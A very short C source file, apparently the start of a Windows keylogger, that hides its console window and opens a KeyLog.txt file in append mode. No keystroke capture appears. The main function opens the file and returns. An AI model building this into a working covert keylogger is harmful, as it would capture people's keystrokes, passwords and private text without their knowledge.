#include "winkey.h"

int main(void)
{
    hideWindow();

    FILE    *LogFile;
    errno_t err;

    if (err = fopen_s(&LogFile, "C:\\Users\\Vicente\\Tmp\\KeyLog.txt", "a+") != 0)
        return 1;


    return 0;
}